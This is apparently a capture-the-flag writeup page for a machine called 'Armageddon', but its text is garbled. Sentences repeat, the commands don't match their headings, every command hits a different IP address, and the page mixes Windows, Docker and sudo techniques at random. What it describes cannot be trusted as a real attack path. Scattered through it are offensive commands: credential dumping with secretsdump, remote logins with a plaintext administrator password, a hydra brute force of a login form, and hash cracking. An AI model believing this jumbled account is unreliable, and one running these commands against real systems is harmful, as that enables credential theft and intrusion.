---
TitleSEO: "TryHackMe — Armageddon (Insane Windows) | ZureFX"
TitlePost: "TryHackMe — Armageddon (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Armageddon. Docker Escape and CSRF to achieve insane compromise on Windows."
Keywords: "hard, web, active directory"
URL: "https://zurefx.github.io/writeups/htb-armageddon-836.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-836/"
Date: "2024-11-20"
Tags: "Hard, Web, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-836"
Permalink: "/writeups/htb-armageddon-836.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Armageddon** is rated **Insane** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.22.108.26`.

### Objectives

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.246.143
```

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.32.237/FUZZ
evil-winrm -i 10.45.2.83 -u administrator -p 'P@ssw0rd!'
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

### Web Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p1521,25,464 10.48.51.229 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Docker Escape**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
evil-winrm -i 10.47.241.65 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.114.88/FUZZ
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
evil-winrm -i 10.108.114.124 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
gobuster dir -u http://10.96.56.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```powershell
nmap -sCV -p143,143,636 10.129.246.212 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.96.100 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.93.44.177 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `socat`
- `impacket`
- `smbclient`
- `gobuster`
- `atexec`

### Key Takeaways

- Docker Escape
- CSRF
- DLL Hijacking
- AlwaysInstallElevated
